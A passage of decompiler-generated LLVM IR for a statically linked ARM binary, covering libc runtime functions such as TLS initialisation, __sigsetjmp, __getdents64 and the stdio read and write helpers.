  store i32 %v15_18b48, i32* %r8.global-to-local, align 4
  store i32 %v18_18b48, i32* %sb.global-to-local, align 4
  store i32 %v21_18b48, i32* %sl.global-to-local, align 4
  store i32 %v24_18b48, i32* %fp.global-to-local, align 4
  store i32 %v27_18b48, i32* @lr, align 4
  %v0_18d30 = call i32 @init_static_tls()
  store i32 %v0_18d30, i32* %r0.global-to-local, align 4
  %v0_18d3c.pre = load i32, i32* @ip, align 4
  %v1_18c04.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_18c14.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18d34

dec_label_pc_18bc0.dec_label_pc_18d34.loopexit_crit_edge: ; preds = %dec_label_pc_18bbc
  br label %dec_label_pc_18d34.loopexit

dec_label_pc_18d34.loopexit:                      ; preds = %dec_label_pc_18bc0.dec_label_pc_18d34.loopexit_crit_edge, %dec_label_pc_18b74
  br label %dec_label_pc_18d34

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18d34.loopexit, %entry, %bb55
  %v0_18c14.pre.pre = phi i32 [ ptrtoint (i32* @global_var_23010.367 to i32), %dec_label_pc_18d34.loopexit ], [ ptrtoint (i32* @global_var_23010.367 to i32), %entry ], [ %v0_18c14.pre.pre.pre, %bb55 ]
  %v1_18c04.pre.pre = phi i32 [ %v0_18b68, %dec_label_pc_18d34.loopexit ], [ %v0_18b68, %entry ], [ %v1_18c04.pre.pre.pre, %bb55 ]
  %v0_18d3c = phi i32 [ %v0_18b6c, %dec_label_pc_18d34.loopexit ], [ %v0_18b6c, %entry ], [ %v0_18d3c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_18d3c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18c00

; uselistorder directives
  uselistorder i32 %v0_18d3c, { 1, 0 }
  uselistorder i32 %v1_18cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18c5c, { 1, 0 }
  uselistorder i32 %v2_18c58, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18bbc, { 2, 1, 0 }
  uselistorder i32 %v3_18b94, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_18b9c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_18bc0, { 1, 0 }
  uselistorder i32 %v0_18b6c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_18b68, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18b5c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 7, 6, 8, 9, 10, 11, 12, 4, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10744, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 3, 7, 4, 5, 8, 6, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_18d34, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_18c04, { 1, 0 }
  uselistorder label %dec_label_pc_18c00, { 1, 0 }
  uselistorder label %dec_label_pc_18b84, { 1, 0 }
}

define i32 @function_18d54(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18d54:
  %v0_18d54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18d54, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_18d54
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_18d54
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18d80 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18d80
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v4_18d90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 156) to i32*), align 4
  %v4_18d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 104) to i32*), align 4
  store i32 %v4_18d98, i32* %r1.global-to-local, align 4
  %v1_18d9c = add i32 %arg1, 44
  %v2_18d9c = inttoptr i32 %v1_18d9c to i32*
  %v3_18d9c = load i32, i32* %v2_18d9c, align 4
  %v1_18da0 = add i32 %arg1, 28
  %v2_18da0 = inttoptr i32 %v1_18da0 to i32*
  %v3_18da0 = load i32, i32* %v2_18da0, align 4
  store i32 %v3_18da0, i32* %r2.global-to-local, align 4
  %v2_18da4 = inttoptr i32 %v4_18d90 to i32*
  store i32 %v3_18d9c, i32* %v2_18da4, align 4
  %v0_18da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18da8 = load i32, i32* %r1.global-to-local, align 4
  %v2_18da8 = inttoptr i32 %v1_18da8 to i32*
  store i32 %v0_18da8, i32* %v2_18da8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 5, 9, 3, 6, 4, 7, 8 }
  uselistorder i32 156, { 0, 1, 3, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18db4(i32 %arg1) local_unnamed_addr {
dec_label_pc_18db4:
  %v0_18db4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18db4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18db4
  %v1_18db4 = load i32, i32* @ip, align 4
  %v3_18db4 = mul i32 %v1_18db4, %arg1
  %v2_18db8 = load i32, i32* @r8, align 4
  %v4_18db8 = and i32 %v2_18db8, %v3_18db4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18db4, %bb
  %v5_18db8 = phi i32 [ %arg1, %dec_label_pc_18db4 ], [ %v4_18db8, %bb ]
  ret i32 %v5_18db8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18dc4 = add i32 %arg1, 40
  store i32 %v1_18dc4, i32* %r2.global-to-local, align 4
  %v1_18dc8 = inttoptr i32 %v1_18dc4 to i32*
  %v2_18dc8 = load i32, i32* %v1_18dc8, align 4
  store i32 %v2_18dc8, i32* %r2.global-to-local, align 4
  %v3_18dc8 = add i32 %arg1, 44
  %v4_18dc8 = inttoptr i32 %v3_18dc8 to i32*
  %v5_18dc8 = load i32, i32* %v4_18dc8, align 4
  store i32 %v5_18dc8, i32* %r3.global-to-local, align 4
  %v0_18dcc = call i32 @__aeabi_read_tp()
  %v1_18dd0 = inttoptr i32 %v0_18dcc to i32*
  %v2_18dd0 = load i32, i32* %v1_18dd0, align 4
  store i32 %v2_18dd0, i32* %r1.global-to-local, align 4
  %v3_18dd4 = mul i32 %v5_18dc8, 8
  store i32 %v3_18dd4, i32* %r3.global-to-local, align 4
  %v1_18dd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18dd8 = add i32 %v1_18dd8, %v0_18dcc
  %v3_18ddc = add i32 %v3_18dd4, %v2_18dd0
  %v4_18ddc = inttoptr i32 %v3_18ddc to i32*
  store i32 %v2_18dd8, i32* %v4_18ddc, align 4
  %v0_18de0 = load i32, i32* %r3.global-to-local, align 4
  %v1_18de0 = load i32, i32* %r1.global-to-local, align 4
  %v2_18de0 = add i32 %v1_18de0, %v0_18de0
  store i32 %v2_18de0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18de8 = add i32 %v2_18de0, 4
  %v5_18de8 = inttoptr i32 %v4_18de8 to i8*
  store i8 1, i8* %v5_18de8, align 1
  %v0_18dec = load i32, i32* @r4, align 4
  %v1_18dec = add i32 %v0_18dec, 20
  store i32 %v1_18dec, i32* %r1.global-to-local, align 4
  %v1_18df0 = inttoptr i32 %v1_18dec to i32*
  %v2_18df0 = load i32, i32* %v1_18df0, align 4
  store i32 %v2_18df0, i32* @r1, align 4
  %v3_18df0 = add i32 %v0_18dec, 24
  %v4_18df0 = inttoptr i32 %v3_18df0 to i32*
  %v5_18df0 = load i32, i32* %v4_18df0, align 4
  store i32 %v5_18df0, i32* %r2.global-to-local, align 4
  %v5_18df4 = call i32 @__GI_mempcpy(i32 %v2_18dd8, i32 %v2_18df0, i32 %v5_18df0, i32 1)
  %v0_18df8 = load i32, i32* @r4, align 4
  %v1_18df8 = add i32 %v0_18df8, 28
  store i32 %v1_18df8, i32* %r3.global-to-local, align 4
  %v1_18dfc = inttoptr i32 %v1_18df8 to i32*
  %v2_18dfc = load i32, i32* %v1_18dfc, align 4
  store i32 %v2_18dfc, i32* %r2.global-to-local, align 4
  %v3_18dfc = add i32 %v0_18df8, 24
  %v4_18dfc = inttoptr i32 %v3_18dfc to i32*
  %v5_18dfc = load i32, i32* %v4_18dfc, align 4
  store i32 %v5_18dfc, i32* %r3.global-to-local, align 4
  %v2_18e00 = sub i32 %v5_18dfc, %v2_18dfc
  store i32 %v2_18e00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18e08 = inttoptr i32 %v5_18df4 to i8*
  %v4_18e08 = call i32 @__GI_memset(i8* %v3_18e08, i32 0, i32 %v2_18e00)
  ret i32 %v4_18e08

; uselistorder directives
  uselistorder i32 %v3_18dd4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18e58:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 11572) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_18e6c = load i32, i32* @r0, align 4
  %v1_18e70 = inttoptr i32 %v0_18e6c to i32*
  %v2_18e70 = load i32, i32* @r4, align 4
  store i32 %v2_18e70, i32* %v1_18e70, align 4
  %v3_18e70 = add i32 %v0_18e6c, 4
  %v4_18e70 = inttoptr i32 %v3_18e70 to i32*
  %v5_18e70 = load i32, i32* @r5, align 4
  store i32 %v5_18e70, i32* %v4_18e70, align 4
  %v6_18e70 = add i32 %v0_18e6c, 8
  %v7_18e70 = inttoptr i32 %v6_18e70 to i32*
  %v8_18e70 = load i32, i32* @r6, align 4
  store i32 %v8_18e70, i32* %v7_18e70, align 4
  %v9_18e70 = add i32 %v0_18e6c, 12
  %v10_18e70 = inttoptr i32 %v9_18e70 to i32*
  %v11_18e70 = load i32, i32* @r7, align 4
  store i32 %v11_18e70, i32* %v10_18e70, align 4
  %v12_18e70 = add i32 %v0_18e6c, 16
  %v13_18e70 = inttoptr i32 %v12_18e70 to i32*
  %v14_18e70 = load i32, i32* @r8, align 4
  store i32 %v14_18e70, i32* %v13_18e70, align 4
  %v15_18e70 = add i32 %v0_18e6c, 20
  %v16_18e70 = inttoptr i32 %v15_18e70 to i32*
  %v17_18e70 = load i32, i32* @sb, align 4
  store i32 %v17_18e70, i32* %v16_18e70, align 4
  %v18_18e70 = add i32 %v0_18e6c, 24
  %v19_18e70 = inttoptr i32 %v18_18e70 to i32*
  %v20_18e70 = load i32, i32* @sl, align 4
  store i32 %v20_18e70, i32* %v19_18e70, align 4
  %v21_18e70 = add i32 %v0_18e6c, 28
  %v22_18e70 = inttoptr i32 %v21_18e70 to i32*
  %v23_18e70 = load i32, i32* @fp, align 4
  store i32 %v23_18e70, i32* %v22_18e70, align 4
  %v24_18e70 = add i32 %v0_18e6c, 32
  %v25_18e70 = inttoptr i32 %v24_18e70 to i32*
  %v27_18e70 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18e70, i32* %v25_18e70, align 4
  %v28_18e70 = add i32 %v0_18e6c, 36
  %v29_18e70 = inttoptr i32 %v28_18e70 to i32*
  %v30_18e70 = load i32, i32* @lr, align 4
  store i32 %v30_18e70, i32* %v29_18e70, align 4
  %v0_18e74 = call i32 @__sigjmp_save()
  ret i32 %v0_18e74

; uselistorder directives
  uselistorder i32 %v0_18e6c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 92, 93, 6, 7, 8, 9, 10, 11, 12, 13, 80, 81, 82, 83, 84, 86, 85, 87, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 23, 24, 25, 26, 28, 29, 32, 30, 31, 0, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 2, 3, 4, 5, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 78, 76, 77, 79, 88, 89, 90, 91, 94 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_18e7c = load i32, i32* @r5, align 4
  %v12_18e7c = load i32, i32* @r7, align 4
  %v1_18e80 = add i32 %arg3, 14
  %v2_18e88 = ptrtoint i32* %stack_var_-72 to i32
  %v1_18e8c = and i32 %v1_18e80, -8
  %v2_18e90 = sub i32 %v2_18e88, %v1_18e8c
  %v1_18e94 = add i32 %v2_18e90, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18ed8, label %dec_label_pc_18ebc

dec_label_pc_18ebc:                               ; preds = %entry
  %v1_18ec0 = sub i32 0, %arg1
  %v3_18ec4 = load i16, i16* @global_var_23068.363, align 2
  %v4_18ec4 = sext i16 %v3_18ec4 to i32
  %v0_18ec8 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18ed0 = add i32 %v4_18ec4, %v0_18ec8
  %v4_18ed0 = inttoptr i32 %v3_18ed0 to i32*
  store i32 %v1_18ec0, i32* %v4_18ed0, align 4
  br label %dec_label_pc_18fa8

dec_label_pc_18ed8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18fa8, label %dec_label_pc_18ee0

dec_label_pc_18ee0:                               ; preds = %dec_label_pc_18ed8
  %v2_18ee0 = add i32 %v1_18e94, %arg1
  store i32 %v2_18ee0, i32* %r1.global-to-local, align 4
  %v2_18ee4 = add i32 %tmp, %arg3
  store i32 %v1_18e94, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18f90
  %v1_18f00 = add i32 %v0_18f60, 16
  %v2_18f00 = inttoptr i32 %v1_18f00 to i16*
  %v3_18f00 = load i16, i16* %v2_18f00, align 2
  %v4_18f00 = zext i16 %v3_18f00 to i32
  %v1_18f04 = add nsw i32 %v4_18f00, -19
  store i32 %v1_18f04, i32* @r2, align 4
  %v1_18f08 = add nuw nsw i32 %v4_18f00, 7
  %v1_18f0c = and i32 %v1_18f08, 131064
  store i32 %v1_18f0c, i32* @ip, align 4
  %v2_18f14 = add i32 %v1_18f0c, %v0_18f68
  store i32 %v2_18f14, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18f14, %v2_18ee4
  br i1 %tmp24, label %dec_label_pc_18f20, label %dec_label_pc_18f5c

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f00
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18f28 = load i32, i32* %r8.global-to-local, align 4
  %v0_18f2c = load i32, i32* %sb.global-to-local, align 4
  %v1_18f30 = load i32, i32* @sp, align 4
  %v2_18f30 = inttoptr i32 %v1_18f30 to i32*
  store i32 0, i32* %v2_18f30, align 4
  %v4_18f34 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_18f28, i32 %v0_18f2c)
  %v0_18f38 = load i32, i32* @r5, align 4
  %v1_18f38 = load i32, i32* %sl.global-to-local, align 4
  %v9_18f38 = icmp eq i32 %v0_18f38, %v1_18f38
  br i1 %v9_18f38, label %dec_label_pc_18f40, label %dec_label_pc_18fa4

dec_label_pc_18f40:                               ; preds = %dec_label_pc_18f20
  %v0_18f44 = call i32 @__aeabi_read_tp()
  %v3_18f48 = load i16, i16* @global_var_23068.363, align 2
  %v4_18f48 = sext i16 %v3_18f48 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18f54 = add i32 %v4_18f48, %v0_18f44
  %v4_18f54 = inttoptr i32 %v3_18f54 to i32*
  store i32 22, i32* %v4_18f54, align 4
  br label %dec_label_pc_18fa8

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f00
  %v1_18f5c = inttoptr i32 %v0_18f60 to i32*
  %v2_18f5c = load i32, i32* %v1_18f5c, align 4
  %v3_18f5c = add i32 %v0_18f60, 4
  %v4_18f5c = inttoptr i32 %v3_18f5c to i32*
  %v5_18f5c = load i32, i32* %v4_18f5c, align 4
  store i32 %v5_18f5c, i32* @r4, align 4
  %v1_18f60 = add i32 %v0_18f60, 8
  store i32 %v1_18f60, i32* %r8.global-to-local, align 4
  %v1_18f64 = inttoptr i32 %v1_18f60 to i32*
  %v2_18f64 = load i32, i32* %v1_18f64, align 4
  store i32 %v2_18f64, i32* %r8.global-to-local, align 4
  %v3_18f64 = add i32 %v0_18f60, 12
  %v4_18f64 = inttoptr i32 %v3_18f64 to i32*
  %v5_18f64 = load i32, i32* %v4_18f64, align 4
  store i32 %v5_18f64, i32* %sb.global-to-local, align 4
  %v1_18f68 = inttoptr i32 %v0_18f68 to i32*
  store i32 %v2_18f5c, i32* %v1_18f68, align 4
  %v3_18f68 = add i32 %v0_18f68, 4
  %v4_18f68 = inttoptr i32 %v3_18f68 to i32*
  %v5_18f68 = load i32, i32* @r4, align 4
  store i32 %v5_18f68, i32* %v4_18f68, align 4
  %v0_18f6c = load i32, i32* %r8.global-to-local, align 4
  %v1_18f6c = load i32, i32* @r5, align 4
  %v2_18f6c = add i32 %v1_18f6c, 8
  %v3_18f6c = inttoptr i32 %v2_18f6c to i32*
  store i32 %v0_18f6c, i32* %v3_18f6c, align 4
  %v0_18f70 = load i32, i32* %sb.global-to-local, align 4
  %v1_18f70 = load i32, i32* @r5, align 4
  %v2_18f70 = add i32 %v1_18f70, 12
  %v3_18f70 = inttoptr i32 %v2_18f70 to i32*
  store i32 %v0_18f70, i32* %v3_18f70, align 4
  %v0_18f74 = load i32, i32* @ip, align 4
  %v1_18f74 = trunc i32 %v0_18f74 to i16
  %v2_18f74 = load i32, i32* @r5, align 4
  %v3_18f74 = add i32 %v2_18f74, 16
  %v4_18f74 = inttoptr i32 %v3_18f74 to i16*
  store i16 %v1_18f74, i16* %v4_18f74, align 2
  %v0_18f78 = load i32, i32* @r7, align 4
  %v1_18f78 = add i32 %v0_18f78, 18
  %v2_18f78 = inttoptr i32 %v1_18f78 to i8*
  %v3_18f78 = load i8, i8* %v2_18f78, align 1
  %v4_18f78 = zext i8 %v3_18f78 to i32
  store i32 %v4_18f78, i32* @r3, align 4
  %v2_18f7c = load i32, i32* @r5, align 4
  %v3_18f7c = add i32 %v2_18f7c, 18
  %v4_18f7c = inttoptr i32 %v3_18f7c to i8*
  store i8 %v3_18f78, i8* %v4_18f7c, align 1
  %v0_18f80 = call i32 @memcpy()
  %v0_18f84 = load i32, i32* @r7, align 4
  %v1_18f84 = add i32 %v0_18f84, 16
  %v2_18f84 = inttoptr i32 %v1_18f84 to i16*
  %v3_18f84 = load i16, i16* %v2_18f84, align 2
  %v4_18f84 = zext i16 %v3_18f84 to i32
  %v0_18f88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18f88, i32* @r5, align 4
  %v2_18f8c = add i32 %v4_18f84, %v0_18f84
  store i32 %v2_18f8c, i32* @r7, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f90:                               ; preds = %dec_label_pc_18ee0, %dec_label_pc_18f5c
  %v0_18f68 = phi i32 [ %tmp, %dec_label_pc_18ee0 ], [ %v0_18f88, %dec_label_pc_18f5c ]
  %v0_18f60 = phi i32 [ %v1_18e94, %dec_label_pc_18ee0 ], [ %v2_18f8c, %dec_label_pc_18f5c ]
  %v3_18f94 = icmp ult i32 %v0_18f60, %v2_18ee0
  %v1_18f98 = add i32 %v0_18f68, 19
  store i32 %v1_18f98, i32* @r0, align 4
  %v1_18f9c = add i32 %v0_18f60, 19
  store i32 %v1_18f9c, i32* @r1, align 4
  br i1 %v3_18f94, label %dec_label_pc_18f00, label %dec_label_pc_18fa4.loopexit

dec_label_pc_18fa4.loopexit:                      ; preds = %dec_label_pc_18f90
  %v0_18fa4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18fa4

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18fa4.loopexit, %dec_label_pc_18f20
  %v1_18fa4 = phi i32 [ %v0_18f68, %dec_label_pc_18fa4.loopexit ], [ %v0_18f38, %dec_label_pc_18f20 ]
  %v0_18fa4 = phi i32 [ %v0_18fa4.pre, %dec_label_pc_18fa4.loopexit ], [ %v1_18f38, %dec_label_pc_18f20 ]
  %v2_18fa4 = sub i32 %v1_18fa4, %v0_18fa4
  store i32 %v2_18fa4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18fa8

dec_label_pc_18fa8:                               ; preds = %dec_label_pc_18ed8, %dec_label_pc_18f40, %dec_label_pc_18ebc, %dec_label_pc_18fa4
  %v0_18fa8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_18e7c, i32* @r5, align 4
  store i32 %v12_18e7c, i32* @r7, align 4
  ret i32 %v0_18fa8

; uselistorder directives
  uselistorder i32 %v0_18f60, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18f68, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18e94, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 12, 13, 0, 3, 14, 4, 15, 16, 9, 10, 11, 17, 5, 6, 7, 8, 1, 18, 2, 19 }
  uselistorder i32 18, { 10, 11, 8, 12, 9, 0, 1, 2, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 10, 13, 14, 7, 15, 8, 16, 9, 17 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18fa8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18f90, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18fc0 = load i32, i32* @r4, align 4
  store i32 %v3_18fc0, i32* %stack_var_-12, align 4
  %v0_18fc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_18fc4 = inttoptr i32 %v0_18fc4 to i16*
  %v2_18fc4 = load i16, i16* %v1_18fc4, align 2
  %v3_18fc4 = zext i16 %v2_18fc4 to i32
  store i32 %v3_18fc4, i32* @r3, align 4
  %v1_18fc8 = and i32 %v3_18fc4, 4
  store i32 %v1_18fc8, i32* @r5, align 4
  %v2_18fc8 = icmp eq i32 %v1_18fc8, 0
  store i32 %v0_18fc4, i32* @r4, align 4
  br i1 %v2_18fc8, label %dec_label_pc_18fdc, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18fdc:                               ; preds = %entry
  %v1_18fdc = icmp slt i32 %arg2, 0
  br i1 %v1_18fdc, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18fdc
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18fdc, %bb18
  %v1_18fe4 = add i32 %v0_18fc4, 4
  %v2_18fe4 = inttoptr i32 %v1_18fe4 to i32*
  %v3_18fe4 = load i32, i32* %v2_18fe4, align 4
  store i32 %v3_18fe4, i32* %r0.global-to-local, align 4
  %v1_18fe8 = call i32 @__libc_read(i32 %v3_18fe4)
  store i32 %v1_18fe8, i32* %r0.global-to-local, align 4
  %v5_18ff0 = icmp sgt i32 %v1_18fe8, 0
  br i1 %v5_18ff0, label %.thread7, label %dec_label_pc_18ff4

dec_label_pc_18ff4:                               ; preds = %bb19
  %v2_18fec = icmp eq i32 %v1_18fe8, 0
  %v0_18ff4 = load i32, i32* @r4, align 4
  %v1_18ff4 = inttoptr i32 %v0_18ff4 to i16*
  %v2_18ff4 = load i16, i16* %v1_18ff4, align 2
  br i1 %v2_18fec, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18ff4
  %v2_18ff8 = or i16 %v2_18ff4, 4
  store i16 %v2_18ff8, i16* %v1_18ff4, align 2
  %v1_19014.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18ff4
  %v2_18ffc = or i16 %v2_18ff4, 8
  store i16 %v2_18ffc, i16* %v1_18ff4, align 2
  %v1_19008 = load i32, i32* @r5, align 4
  store i32 %v1_19008, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_19014 = phi i32 [ %v1_19014.pre, %bb20 ], [ 0, %bb ], [ %v1_18fe8, %bb19 ], [ %v1_19008, %bb21 ]
  %v2_19010 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19010, i32* @r4, align 4
  ret i32 %v1_19014

; uselistorder directives
  uselistorder i16 %v2_18ff4, { 1, 0 }
  uselistorder i32 %v1_18fe8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_190dc2 = icmp eq i32 %arg3, 0
  store i1 %v2_190dc2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190dc2, label %dec_label_pc_190e4, label %dec_label_pc_19034

dec_label_pc_19034:                               ; preds = %entry, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge
  %v0_19040 = phi i32 [ %v0_19040.pre, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge ], [ %tmp, %entry ]
  %v0_1903c = phi i32 [ %v5_1904c, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge ], [ %arg2, %entry ]
